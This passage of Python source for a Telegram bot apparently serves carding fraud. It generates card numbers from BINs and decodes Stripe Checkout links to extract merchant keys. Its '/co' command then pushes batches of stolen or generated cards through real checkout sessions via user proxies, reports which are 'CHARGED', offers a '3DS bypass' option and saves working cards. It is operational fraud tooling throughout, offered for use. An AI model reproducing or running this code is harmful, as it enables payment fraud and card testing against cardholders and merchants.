            await loading_msg.delete()
            return await event.reply(f"<b>Error:</b> <code>{info}</code>", parse_mode='html')

        if not cards:
            await loading_msg.delete()
            return await event.reply("<b>No cards generated. Check your BIN format.</b>", parse_mode='html')

        # Get BIN info for display
        bin_number = bin_clean[:6]
        brand, bin_type, level, bank, country, flag = await get_bin_info(bin_number + "0000000000")

        # Format the response - send as file if more than 20 cards
        if len(cards) > 20:
            # Save to file for large amounts
            filename = f"gen_{event.sender_id}_{int(time.time())}.txt"
            async with aiofiles.open(filename, "w") as f:
                await f.write("\n".join(cards))

            await loading_msg.delete()
            caption = (
                f"Generated {len(cards)} Cards\n\n"
                f"Bin: {bin_input}\n"
                f"Amount: {len(cards)}\n"
                f"Info: {brand} - {bin_type} - {level}\n"
                f"Bank: {bank}\n"
                f"Country: {country} {flag}\n"
                f"━━━━━━━━━━━━━"
            )
            await event.reply(caption, file=filename)
            os.remove(filename)
        else:
            cards_formatted = format_gen_cards(cards)

            buttons = [
                [Button.inline("Regenerate", f"regen|{bin_input}|{count}".encode()),
                 Button.inline("Close", b"close_gen")]
            ]

            await loading_msg.delete()
            await event.reply(
                f"• <b>Bin:</b> <code>{bin_input}</code>\n"
                f"• <b>Amount:</b> <code>{len(cards)}</code>\n\n"
                f"{cards_formatted}\n"
                f"━━━━━━━━━━━━━\n"
                f"• <b>Info:</b> <code>{brand} - {bin_type} - {level}</code>\n"
                f"• <b>Bank:</b> <code>{bank}</code>\n"
                f"• <b>Country:</b> <code>{country} {flag}</code>",
                buttons=buttons,
                parse_mode='html'
            )

    except Exception as e:
        await event.reply(f"<b>Error:</b> <code>{str(e)}</code>", parse_mode='html')

@client.on(events.CallbackQuery(pattern=rb"regen\|(.+)\|(.+)"))
async def regen_callback(event):
    """Regenerate cards callback"""
    try:
        match = event.pattern_match
        bin_input = match.group(1).decode()
        count = int(match.group(2).decode())

        loading_msg = await event.edit("<b>Regenerating cards...</b>", parse_mode='html')

        cards, info = await generate_cards_api(bin_input, count)

        if cards is None:
            await loading_msg.delete()
            return await event.respond(f"<b>Error:</b> <code>{info}</code>", parse_mode='html')

        if not cards:
            await loading_msg.delete()
            return await event.respond("<b>No cards generated. Check your BIN format.</b>", parse_mode='html')

        # Get BIN info for display
        bin_clean = bin_input.replace("|", "").replace("x", "").replace("X", "")
        bin_number = bin_clean[:6]
        brand, bin_type, level, bank, country, flag = await get_bin_info(bin_number + "0000000000")

        # Send as file if more than 20 cards
        if len(cards) > 20:
            filename = f"gen_{event.sender_id}_{int(time.time())}.txt"
            async with aiofiles.open(filename, "w") as f:
                await f.write("\n".join(cards))

            await loading_msg.delete()
            caption = (
                f"Generated {len(cards)} Cards\n\n"
                f"Bin: {bin_input}\n"
                f"Amount: {len(cards)}\n"
                f"Info: {brand} - {bin_type} - {level}\n"
                f"Bank: {bank}\n"
                f"Country: {country} {flag}\n"
                f"━━━━━━━━━━━━━"
            )
            await event.respond(caption, file=filename)
            os.remove(filename)
        else:
            cards_formatted = format_gen_cards(cards)

            buttons = [
                [Button.inline("Regenerate", f"regen|{bin_input}|{count}".encode()),
                 Button.inline("Close", b"close_gen")]
            ]

            await loading_msg.edit(
                f"• <b>Bin:</b> <code>{bin_input}</code>\n"
                f"• <b>Amount:</b> <code>{len(cards)}</code>\n\n"
                f"{cards_formatted}\n"
                f"━━━━━━━━━━━━━\n"
                f"• <b>Info:</b> <code>{brand} - {bin_type} - {level}</code>\n"
                f"• <b>Bank:</b> <code>{bank}</code>\n"
                f"• <b>Country:</b> <code>{country} {flag}</code>",
                buttons=buttons,
                parse_mode='html'
            )
    except Exception as e:
        await event.answer(f"Error: {str(e)}", alert=True)

@client.on(events.CallbackQuery(pattern=b"close_gen"))
async def close_gen_callback(event):
    """Close generator message"""
    try:
        await event.delete()
    except:
        pass


# --- Stripe Checkout Functions ---

CO_HEADERS = {
    "accept": "application/json",
    "content-type": "application/x-www-form-urlencoded",
    "origin": "https://checkout.stripe.com",
    "referer": "https://checkout.stripe.com/",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "stripe-version": "2020-08-27",
    "x-stripe-client-user-agent": '{"bindings_version":"5.26.0","lang":"JavaScript","lang_version":"Chrome 120","platform":"Web","publisher":"stripe","uname":"","stripe_js_id":"stripe-js-v3"}'
}

_co_session = None

async def get_co_session():
    global _co_session
    if _co_session is None or _co_session.closed:
        _co_session = aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(limit=100, ttl_dns_cache=300),
            timeout=aiohttp.ClientTimeout(total=25, connect=8)
        )
    return _co_session

def extract_co_url(text: str) -> str:
    patterns = [
        r'https?://checkout\.stripe\.com/c/pay/cs_[^\s"\'\<\>\)]+',
        r'https?://checkout\.stripe\.com/[^\s"\'\<\>\)]+',
        r'https?://buy\.stripe\.com/[^\s"\'\<\>\)]+',
    ]
    for p in patterns:
        m = re.search(p, text, re.IGNORECASE)
        if m:
            url = m.group(0).rstrip('.,;:')
            return url
    return None

def decode_co_pk(url: str) -> dict:
    from urllib.parse import unquote
    import base64
    result = {"pk": None, "cs": None, "site": None}
    try:
        cs_match = re.search(r'cs_(live|test)_[A-Za-z0-9]+', url)
        if cs_match:
            result["cs"] = cs_match.group(0)
        if '#' not in url:
            return result
        hash_part = url.split('#')[1]
        hash_decoded = unquote(hash_part)
        try:
            decoded_bytes = base64.b64decode(hash_decoded)
            xored = ''.join(chr(b ^ 5) for b in decoded_bytes)
            pk_match = re.search(r'pk_(live|test)_[A-Za-z0-9]+', xored)
            if pk_match:
                result["pk"] = pk_match.group(0)
            site_match = re.search(r'https?://[^\s"\'\<\>]+', xored)
            if site_match:
                result["site"] = site_match.group(0)
        except:
            pass
    except:
        pass
    return result

def parse_co_card(text: str) -> dict:
    text = text.strip()
    parts = re.split(r'[|:/\-\s]+', text)
    if len(parts) < 4:
        return None
    cc = re.sub(r'\D', '', parts[0])
    if not (15 <= len(cc) <= 19):
        return None
    month = parts[1].strip()
    if len(month) == 1:
        month = f"0{month}"
    if not (len(month) == 2 and month.isdigit() and 1 <= int(month) <= 12):
        return None
    year = parts[2].strip()
    if len(year) == 4:
        year = year[2:]
    if len(year) != 2:
        return None
    cvv = re.sub(r'\D', '', parts[3])
    if not (3 <= len(cvv) <= 4):
        return None
    return {"cc": cc, "month": month, "year": year, "cvv": cvv}

def parse_co_cards(text: str) -> list:
    cards = []
    for line in text.strip().split('\n'):
        line = line.strip()
        if line:
            card = parse_co_card(line)
            if card:
                cards.append(card)
    return cards

async def get_checkout_info(url: str) -> dict:
    start = time.perf_counter()
    result = {"url": url, "pk": None, "cs": None, "merchant": None, "price": None, "currency": None, "product": None, "country": None, "mode": None, "customer_name": None, "customer_email": None, "support_email": None, "support_phone": None, "cards_accepted": None, "success_url": None, "cancel_url": None, "init_data": None, "error": None, "time": 0}
    try:
        decoded = decode_co_pk(url)
        result["pk"] = decoded.get("pk")
        result["cs"] = decoded.get("cs")
        if not result["pk"]:
            result["error"] = "Could not decode PK from URL"
            result["time"] = round(time.perf_counter() - start, 2)
            return result
        if not result["cs"]:
            result["error"] = "Could not extract CS from URL"
            result["time"] = round(time.perf_counter() - start, 2)
            return result
        pk_for_init = result["pk"]
        s = await get_co_session()
        body = f"key={pk_for_init}&eid=NA&browser_locale=en-US&redirect_type=url"
        async with s.post(f"https://api.stripe.com/v1/payment_pages/{result['cs']}/init", headers=CO_HEADERS, data=body) as r:
            init_data = await r.json()
        if "error" not in init_data:
            result["init_data"] = init_data
            acc = init_data.get("account_settings", {})
            result["merchant"] = acc.get("display_name") or acc.get("business_name")
            result["support_email"] = acc.get("support_email")
            result["support_phone"] = acc.get("support_phone")
            result["country"] = acc.get("country")
            lig = init_data.get("line_item_group")
            inv = init_data.get("invoice")
            if lig:
                result["price"] = lig.get("total", 0) / 100
                result["currency"] = lig.get("currency", "").upper()
                if lig.get("line_items"):
                    items = lig["line_items"]
                    currency = lig.get("currency", "").upper()
                    sym = {"USD": "$", "EUR": "€", "GBP": "£", "INR": "₹"}.get(currency, "")
                    product_parts = []
                    for item in items:
                        qty = item.get("quantity", 1)
                        name = item.get("name", "Product")
                        amt = item.get("amount", 0) / 100
                        interval = item.get("recurring_interval")
                        if interval:
                            product_parts.append(f"{qty} × {name} (at {sym}{amt:.2f} / {interval})")
                        else:
                            product_parts.append(f"{qty} × {name} ({sym}{amt:.2f})")
                    result["product"] = ", ".join(product_parts)
            elif inv:
                result["price"] = inv.get("total", 0) / 100
                result["currency"] = inv.get("currency", "").upper()
            mode = init_data.get("mode", "")
            if mode:
                result["mode"] = mode.upper()
            elif init_data.get("subscription"):
                result["mode"] = "SUBSCRIPTION"
            else:
                result["mode"] = "PAYMENT"
            cust = init_data.get("customer") or {}
            result["customer_name"] = cust.get("name")
            result["customer_email"] = init_data.get("customer_email") or cust.get("email")
            pm_types = init_data.get("payment_method_types") or []
            if pm_types:
                cards = [t.upper() for t in pm_types if t != "card"]
                if "card" in pm_types:
                    cards.insert(0, "CARD")
                result["cards_accepted"] = ", ".join(cards) if cards else "CARD"
            result["success_url"] = init_data.get("success_url")
            result["cancel_url"] = init_data.get("cancel_url")
        else:
            result["error"] = init_data.get("error", {}).get("message", "Init failed")
    except Exception as e:
        result["error"] = str(e)
    result["time"] = round(time.perf_counter() - start, 2)
    return result

async def charge_co_card(card: dict, checkout_data: dict, proxy_str: str = None, bypass_3ds: bool = False, max_retries: int = 2) -> dict:
    start = time.perf_counter()
    card_display = f"{card['cc'][:6]}****{card['cc'][-4:]}"
    result = {"card": f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}", "status": None, "response": None, "time": 0}
    pk = checkout_data.get("pk")
    cs = checkout_data.get("cs")
    init_data = checkout_data.get("init_data")
    if not pk or not cs or not init_data:
        result["status"] = "FAILED"
        result["response"] = "No checkout data"
        result["time"] = round(time.perf_counter() - start, 2)
        return result
    for attempt in range(max_retries + 1):
        try:
            # Use bot's proxy format (host:port:user:pass)
            proxy_url = None
            if proxy_str:
                parts = proxy_str.split(':')
                if len(parts) == 4:
                    proxy_url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
                elif len(parts) == 2:
                    proxy_url = f"http://{parts[0]}:{parts[1]}"
            connector = aiohttp.TCPConnector(limit=100, ssl=False)
            async with aiohttp.ClientSession(connector=connector) as s:
                email = init_data.get("customer_email") or "john@example.com"
                checksum = init_data.get("init_checksum", "")
                lig = init_data.get("line_item_group")
                inv = init_data.get("invoice")
                if lig:
                    total, subtotal = lig.get("total", 0), lig.get("subtotal", 0)
                elif inv:
                    total, subtotal = inv.get("total", 0), inv.get("subtotal", 0)
                else:
                    pi = init_data.get("payment_intent") or {}
                    total = subtotal = pi.get("amount", 0)
                cust = init_data.get("customer") or {}
                addr = cust.get("address") or {}
                name = cust.get("name") or "John Smith"
                country = addr.get("country") or "US"
                line1 = addr.get("line1") or "476 West White Mountain Blvd"
                city = addr.get("city") or "Pinetop"
                state = addr.get("state") or "AZ"
                zip_code = addr.get("postal_code") or "85929"
                pm_body = f"type=card&card[number]={card['cc']}&card[cvc]={card['cvv']}&card[exp_month]={card['month']}&card[exp_year]={card['year']}&billing_details[name]={name}&billing_details[email]={email}&billing_details[address][country]={country}&billing_details[address][line1]={line1}&billing_details[address][city]={city}&billing_details[address][postal_code]={zip_code}&billing_details[address][state]={state}&payment_user_agent=stripe.js%2Facacia+card%2Fcheckout&referrer=https%3A%2F%2Fcheckout.stripe.com&key={pk}"
                async with s.post("https://api.stripe.com/v1/payment_methods", headers=CO_HEADERS, data=pm_body, proxy=proxy_url) as r:
                    pm = await r.json()
                if "error" in pm:
                    err_msg = pm["error"].get("message", "Card error")
                    result["status"] = "DECLINED"
                    result["response"] = err_msg
                    result["time"] = round(time.perf_counter() - start, 2)
                    return result
                pm_id = pm.get("id")
                if not pm_id:
                    result["status"] = "FAILED"
                    result["response"] = "No PM"
                    result["time"] = round(time.perf_counter() - start, 2)
                    return result
                conf_body = f"eid=NA&payment_method={pm_id}&expected_amount={total}&last_displayed_line_item_group_details[subtotal]={subtotal}&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&key={pk}&init_checksum={checksum}"
                if bypass_3ds:
                    conf_body += "&return_url=https://checkout.stripe.com"
                async with s.post(f"https://api.stripe.com/v1/payment_pages/{cs}/confirm", headers=CO_HEADERS, data=conf_body, proxy=proxy_url) as r:
                    conf = await r.json()
                if "error" in conf:
                    err = conf["error"]
                    dc = err.get("decline_code", "")
                    msg = err.get("message", "Failed")
                    result["status"] = "DECLINED"
                    result["response"] = f"{dc.upper()}: {msg}" if dc else msg
                else:
                    pi = conf.get("payment_intent") or {}
                    st = pi.get("status", "") or conf.get("status", "")
                    if st == "succeeded":
                        result["status"] = "CHARGED"
                        result["response"] = "Payment Successful"
                    elif st == "requires_action":
                        if bypass_3ds:
                            result["status"] = "3DS SKIP"
                            result["response"] = "3DS Cannot be bypassed"
                        else:
                            result["status"] = "3DS"
                            result["response"] = "3DS Required"
                    elif st == "requires_payment_method":
                        result["status"] = "DECLINED"
                        result["response"] = "Card Declined"
                    else:
                        result["status"] = "UNKNOWN"
                        result["response"] = st or "Unknown"
                result["time"] = round(time.perf_counter() - start, 2)
                return result
        except Exception as e:
            err_str = str(e)
            if attempt < max_retries and ("disconnect" in err_str.lower() or "timeout" in err_str.lower() or "connection" in err_str.lower()):
                await asyncio.sleep(1)
                continue
            result["status"] = "ERROR"
            result["response"] = err_str[:50]
            result["time"] = round(time.perf_counter() - start, 2)
            return result
    return result

async def check_checkout_active(pk: str, cs: str) -> bool:
    try:
        s = await get_co_session()
        body = f"key={pk}&eid=NA&browser_locale=en-US&redirect_type=url"
        async with s.post(f"https://api.stripe.com/v1/payment_pages/{cs}/init", headers=CO_HEADERS, data=body, timeout=aiohttp.ClientTimeout(total=5)) as r:
            data = await r.json()
            return "error" not in data
    except:
        return False


@client.on(events.NewMessage(pattern=r'(?i)^[/.]co'))
async def co_handler(event):
    """Stripe Checkout handler - NEW INTEGRATED VERSION"""
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned":
        return await event.reply(banned_user_message())
    if not can_access:
        buttons = [[Button.url("𝙐𝙨𝙚 𝙄𝙣 𝙂𝙧𝙤𝙪𝙥 𝙁𝙧𝙚𝙚", f"https://t.me/+9prhieUj5lI2NTFl")]]
        return await event.reply("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨!", buttons=buttons)

    start_time = time.perf_counter()
    user_id = event.sender_id
    is_premium = await is_premium_user(user_id)

    # Check if user has proxy configured
    user_proxy_data = await get_user_proxy(user_id)
    if not user_proxy_data:
        await event.reply(
            "<blockquote><code>𝗡𝗼 𝗣𝗿𝗼𝘅𝘆</code></blockquote>\n\n"
            "<blockquote>「❃」 𝗦𝘁𝗮𝘁𝘂𝘀 : <code>You must set a proxy first</code>\n"
            "「❃」 𝗔𝗰𝘁𝗶𝗼𝗻 : <code>/addpxy host:port:user:pass</code></blockquote>",
            parse_mode='html'
        )
        return

    # Build proxy string
    ip = user_proxy_data.get('ip')
    port = user_proxy_data.get('port')
    username = user_proxy_data.get('username')
    password = user_proxy_data.get('password')
    if username and password:
        user_proxy = f"{ip}:{port}:{username}:{password}"
    else:
        user_proxy = f"{ip}:{port}"

    text = event.raw_text or ""
    lines = text.strip().split('\n')
    first_line_args = lines[0].split(maxsplit=3)

    if len(first_line_args) < 2:
        await event.reply(
            "<blockquote><code>𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗲𝗰𝗸𝗼𝘂𝘁</code></blockquote>\n\n"
            "<blockquote>「❃」 𝗣𝗮𝗿𝘀𝗲 : <code>/co `url`</code>\n"
            "「❃」 𝗖𝗵𝗮𝗿𝗴𝗲 : <code>/co `url` cc|mm|yy|cvv</code>\n"
            "「❃」 𝗕𝘆𝗽𝗮𝘀𝘀 : <code>/co yes `url` cc|mm|yy|cvv</code>\n"
            "「❃」 𝗥𝗲𝗽𝗹𝘆 : <code>Reply to link with /co cc|mm|yy|cvv</code>\n"
            "「❃」 𝗙𝗶𝗹𝗲 : <code>Reply to .txt with /co `url`</code></blockquote>",
            parse_mode='html'
        )
        return

    # Check if replying to a message with checkout link
    url = None
    cards = []
    bypass_3ds = False

    if event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.text:
            url = extract_co_url(replied_msg.text)
            if len(first_line_args) > 1:
                if first_line_args[1].lower() in ['yes', 'no']:
                    bypass_3ds = first_line_args[1].lower() == 'yes'
                    if len(first_line_args) > 2:
                        cards = parse_co_cards(first_line_args[2])
                else:
                    cards = parse_co_cards(first_line_args[1])
        if replied_msg and replied_msg.document:
            doc = replied_msg.document
            if doc.file_name and doc.file_name.endswith('.txt'):
                try:
                    file_path = await replied_msg.download_media()
                    async with aiofiles.open(file_path, "r") as f:
                        text_content = await f.read()
                    os.remove(file_path)
                    cards = parse_co_cards(text_content)
                except Exception as e:
                    await event.reply(
                        "<blockquote><code>𝗘𝗿𝗿𝗼𝗿</code></blockquote>\n\n"
                        f"<blockquote>「❃」 𝗗𝗲𝘁𝗮𝗶𝗹 : <code>Failed to read file: {str(e)}</code></blockquote>",
                        parse_mode='html'
                    )
                    return

    # If no URL from reply, get from command
    if not url:
        clean_arg = first_line_args[1].strip().strip('`')
        url = extract_co_url(clean_arg)
        if not url:
            url = clean_arg

    # Check if URL has the required hash fragment
    if url and '#' not in url:
        await event.reply(
            "<blockquote><code>𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗨𝗥𝗟</code></blockquote>\n\n"
            "<blockquote>「❃」 𝗗𝗲𝘁𝗮𝗶𝗹 : <code>URL missing hash fragment (#)</code>\n"
            "「❃」 𝗙𝗶𝘅 : <code>Wrap URL in backticks</code>\n"
            "「❃」 𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : <code>/co `url`</code>\n"
            "「❃」 𝗢𝗿 : <code>Replace # with %23</code></blockquote>",
            parse_mode='html'
        )
        return

    # Parse cards and bypass from command
    if not event.reply_to_msg_id:
        if len(first_line_args) > 2:
            if first_line_args[2].lower() in ['yes', 'no']:
                bypass_3ds = first_line_args[2].lower() == 'yes'
                if len(first_line_args) > 3:
                    cards = parse_co_cards(first_line_args[3])
            else:
                cards = parse_co_cards(first_line_args[2])

        if len(lines) > 1:
            remaining_text = '\n'.join(lines[1:])
            cards.extend(parse_co_cards(remaining_text))

    # Apply card limits
    max_cards = 50 if is_premium else 20
    if len(cards) > max_cards:
        cards = cards[:max_cards]
        await event.reply(f"⚠️ <b>Card limit exceeded. Only checking first {max_cards} cards.</b>", parse_mode='html')

    proxy_display = f"Using Proxy ✅"

    processing_msg = await event.reply(
        "<blockquote><code>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴</code></blockquote>\n\n"
        f"<blockquote>「❃」 𝗣𝗿𝗼𝘅𝘆 : <code>{proxy_display}</code>\n"
        "「❃」 𝗦𝘁𝗮𝘁𝘂𝘀 : <code>Parsing checkout...</code></blockquote>",
        parse_mode='html'
    )

    checkout_data = await get_checkout_info(url)

    if checkout_data.get("error"):
        await processing_msg.edit(
            "<blockquote><code>𝗘𝗿𝗿𝗼𝗿</code></blockquote>\n\n"
            f"<blockquote>「❃」 𝗗𝗲𝘁𝗮𝗶𝗹 : <code>{checkout_data['error']}</code></blockquote>",
            parse_mode='html'
        )
        return

    if not cards:
        currency = checkout_data.get('currency', '')
        sym = {"USD": "$", "EUR": "€", "GBP": "£", "INR": "₹"}.get(currency, "")
        price_str = f"{sym}{checkout_data['price']:.2f} {currency}" if checkout_data['price'] else "N/A"
        total_time = round(time.perf_counter() - start_time, 2)

        response = f"<blockquote><code>「 𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗲𝗰𝗸𝗼𝘂𝘁 {price_str} 」</code></blockquote>\n\n"
        response += f"<blockquote>「❃」 𝗣𝗿𝗼𝘅𝘆 : <code>{proxy_display}</code>\n"
        response += f"「❃」 𝗖𝗦 : <code>{checkout_data['cs'] or 'N/A'}</code>\n"
        response += f"「❃」 𝗣𝗞 : <code>{checkout_data['pk'] or 'N/A'}</code>\n"
        response += f"「❃」 𝗦𝘁𝗮𝘁𝘂𝘀 : <code>SUCCESS ✅</code></blockquote>\n\n"

        response += f"<blockquote>「❃」 𝗠𝗲𝗿𝗰𝗵𝗮𝗻𝘁 : <code>{checkout_data['merchant'] or 'N/A'}</code>\n"
        response += f"「❃」 𝗣𝗿𝗼𝗱𝘂𝗰𝘁 : <code>{checkout_data['product'] or 'N/A'}</code>\n"
        response += f"「❃」 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 : <code>{checkout_data['country'] or 'N/A'}</code>\n"
        response += f"「❃」 𝗠𝗼𝗱𝗲 : <code>{checkout_data['mode'] or 'N/A'}</code></blockquote>\n\n"

        if checkout_data['customer_name'] or checkout_data['customer_email']:
            response += f"<blockquote>「❃」 𝗖𝘂𝘀𝘁𝗼𝗺𝗲𝗿 : <code>{checkout_data['customer_name'] or 'N/A'}</code>\n"
            response += f"「❃」 𝗘𝗺𝗮𝗶𝗹 : <code>{checkout_data['customer_email'] or 'N/A'}</code></blockquote>\n\n"

        if checkout_data['support_email'] or checkout_data['support_phone']:
            response += f"<blockquote>「❃」 𝗦𝘂𝗽𝗽𝗼𝗿𝘁 : <code>{checkout_data['support_email'] or 'N/A'}</code>\n"
            response += f"「❃」 𝗣𝗵𝗼𝗻𝗲 : <code>{checkout_data['support_phone'] or 'N/A'}</code></blockquote>\n\n"

        if checkout_data['cards_accepted']:
            response += f"<blockquote>「❃」 𝗖𝗮𝗿𝗱𝘀 : <code>{checkout_data['cards_accepted']}</code></blockquote>\n\n"

        if checkout_data['success_url'] or checkout_data['cancel_url']:
            response += f"<blockquote>「❃」 𝗦𝘂𝗰𝗰𝗲𝘀𝘀 : <code>{checkout_data['success_url'] or 'N/A'}</code>\n"
            response += f"「❃」 𝗖𝗮𝗻𝗰𝗲𝗹 : <code>{checkout_data['cancel_url'] or 'N/A'}</code></blockquote>\n\n"

        response += f"<blockquote>「❃」 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 : <code>/co</code>\n"
        response += f"「❃」 𝗧𝗶𝗺𝗲 : <code>{total_time}s</code></blockquote>"

        await processing_msg.edit(response, parse_mode='html')
        return

    bypass_str = "YES 🔓" if bypass_3ds else "NO 🔒"
    currency = checkout_data.get('currency', '')
    sym = {"USD": "$", "EUR": "€", "GBP": "£", "INR": "₹"}.get(currency, "")
    price_str = f"{sym}{checkout_data['price']:.2f} {currency}" if checkout_data['price'] else "N/A"

    await processing_msg.edit(
        f"<blockquote><code>「 𝗖𝗵𝗮𝗿𝗴𝗶𝗻𝗴 {price_str} 」</code></blockquote>\n\n"
        f"<blockquote>「❃」 𝗣𝗿𝗼𝘅𝘆 : <code>{proxy_display}</code>\n"
        f"「❃」 𝗕𝘆𝗽𝗮𝘀𝘀 : <code>{bypass_str}</code>\n"
        f"「❃」 𝗖𝗮𝗿𝗱𝘀 : <code>{len(cards)}</code>\n"
        f"「❃」 𝗦𝘁𝗮𝘁𝘂𝘀 : <code>Starting...</code></blockquote>",
        parse_mode='html'
    )

    results = []
    charged_card = None
    cancelled = False
    check_interval = 5
    last_update = time.perf_counter()

    for i, card in enumerate(cards):
        if len(cards) > 1 and i > 0 and i % check_interval == 0:
            is_active = await check_checkout_active(checkout_data['pk'], checkout_data['cs'])
            if not is_active:
                cancelled = True
                break

        result = await charge_co_card(card, checkout_data, user_proxy, bypass_3ds)
        results.append(result)

        if len(cards) > 1 and (time.perf_counter() - last_update) > 1.5:
            last_update = time.perf_counter()
            charged = sum(1 for r in results if r['status'] == 'CHARGED')
            declined = sum(1 for r in results if r['status'] == 'DECLINED')
            three_ds = sum(1 for r in results if r['status'] in ['3DS', '3DS SKIP'])
            errors = sum(1 for r in results if r['status'] in ['ERROR', 'FAILED'])

            try:
                await processing_msg.edit(
                    f"<blockquote><code>「 𝗖𝗵𝗮𝗿𝗴𝗶𝗻𝗴 {price_str} 」</code></blockquote>\n\n"
                    f"<blockquote>「❃」 𝗣𝗿𝗼𝘅𝘆 : <code>{proxy_display}</code>\n"
                    f"「❃」 𝗕𝘆𝗽𝗮𝘀𝘀 : <code>{bypass_str}</code>\n"
                    f"「❃」 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀 : <code>{i+1}/{len(cards)}</code></blockquote>\n\n"
                    f"<blockquote>「❃」 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 : <code>{charged} ✅</code>\n"
                    f"「❃」 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 : <code>{declined} ❌</code>\n"
                    f"「❃」 𝟯𝗗𝗦 : <code>{three_ds} 🔐</code>\n"
                    f"「❃」 𝗘𝗿𝗿𝗼𝗿𝘀 : <code>{errors} ⚠️</code></blockquote>",
                    parse_mode='html'
                )
            except:
                pass

        if result['status'] == 'CHARGED':
            charged_card = result
            break

    total_time = round(time.perf_counter() - start_time, 2)

    if cancelled:
        response = f"<blockquote><code>「 𝗖𝗵𝗲𝗰𝗸𝗼𝘂𝘁 𝗖𝗮𝗻𝗰𝗲𝗹𝗹𝗲𝗱 ⛔ 」</code></blockquote>\n\n"
        response += f"<blockquote>「❃」 𝗣𝗿𝗼𝘅𝘆 : <code>{proxy_display}</code>\n"
        response += f"「❃」 𝗠𝗲𝗿𝗰𝗵𝗮𝗻𝘁 : <code>{checkout_data['merchant'] or 'N/A'}</code>\n"
        response += f"「❃」 𝗥𝗲𝗮𝘀𝗼𝗻 : <code>Checkout no longer active</code></blockquote>\n\n"

        charged = sum(1 for r in results if r['status'] == 'CHARGED')
        declined = sum(1 for r in results if r['status'] == 'DECLINED')
        three_ds = sum(1 for r in results if r['status'] in ['3DS', '3DS SKIP'])

        response += f"<blockquote>「❃」 𝗧𝗿𝗶𝗲𝗱 : <code>{len(results)}/{len(cards)} cards</code>\n"
        response += f"「❃」 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 : <code>{charged} ✅</code>\n"
        response += f"「❃」 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 : <code>{declined} ❌</code>\n"
        response += f"「❃」 𝟯𝗗𝗦 : <code>{three_ds} 🔐</code></blockquote>\n\n"

        response += f"<blockquote>「❃」 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 : <code>/co</code>\n"
        response += f"「❃」 𝗧𝗼𝘁𝗮𝗹 𝗧𝗶𝗺𝗲 : <code>{total_time}s</code></blockquote>"

        await processing_msg.edit(response, parse_mode='html')
        return

    if charged_card:
        response = f"<blockquote><code>「 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 ✅ {price_str} 」</code></blockquote>\n\n"
        response += f"<blockquote>「❃」 𝗣𝗿𝗼𝘅𝘆 : <code>{proxy_display}</code>\n"
        response += f"「❃」 𝗠𝗲𝗿𝗰𝗵𝗮𝗻𝘁 : <code>{checkout_data['merchant'] or 'N/A'}</code>\n"
        response += f"「❃」 𝗣𝗿𝗼𝗱𝘂𝗰𝘁 : <code>{checkout_data['product'] or 'N/A'}</code></blockquote>\n\n"

        response += f"<blockquote>「❃」 𝗖𝗮𝗿𝗱 : <code>{charged_card['card']}</code>\n"
        response += f"「❃」 𝗦𝘁𝗮𝘁𝘂𝘀 : <code>{charged_card['status']} ✅</code>\n"
        response += f"「❃」 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : <code>{charged_card['response']}</code>\n"
        response += f"「❃」 𝗧𝗶𝗺𝗲 : <code>{charged_card['time']}s</code></blockquote>\n\n"

        tried = len(results)
        response += f"<blockquote>「❃」 𝗧𝗿𝗶𝗲𝗱 : <code>{tried} cards</code>\n"
        response += f"「❃」 𝗧𝗼𝘁𝗮𝗹 𝗧𝗶𝗺𝗲 : <code>{total_time}s</code></blockquote>"

        await processing_msg.edit(response, parse_mode='html')

        await save_approved_card(charged_card['card'], 'CHARGED', charged_card['response'], 'Stripe Checkout', price_str)
        return

    last_result = results[-1] if results else {"status": "FAILED", "response": "No results", "time": 0}

    response = f"<blockquote><code>「 𝗥𝗲𝘀𝘂𝗹𝘁 {price_str} 」</code></blockquote>\n\n"
    response += f"<blockquote>「❃」 𝗣𝗿𝗼𝘅𝘆 : <code>{proxy_display}</code>\n"
    response += f"「❃」 𝗺𝗲𝗿𝗰𝗵𝗮𝗻𝘁 : <code>{checkout_data['merchant'] or 'N/A'}</code>\n"
    response += f"「❃」 𝗣𝗿𝗼𝗱𝘂𝗰𝘁 : <code>{checkout_data['product'] or 'N/A'}</code></blockquote>\n\n"

    charged = sum(1 for r in results if r['status'] == 'CHARGED')
    declined = sum(1 for r in results if r['status'] == 'DECLINED')
    three_ds = sum(1 for r in results if r['status'] in ['3DS', '3DS SKIP'])
    errors = sum(1 for r in results if r['status'] in ['ERROR', 'FAILED'])

    response += f"<blockquote>「❃」 𝗧𝗿𝗶𝗲𝗱 : <code>{len(results)}/{len(cards)} cards</code>\n"
    response += f"「❃」 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 : <code>{charged} ✅</code>\n"
    response += f"「❃」 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 : <code>{declined} ❌</code>\n"
    response += f"「❃」 𝟯𝗗𝗦 : <code>{three_ds} 🔐</code>\n"
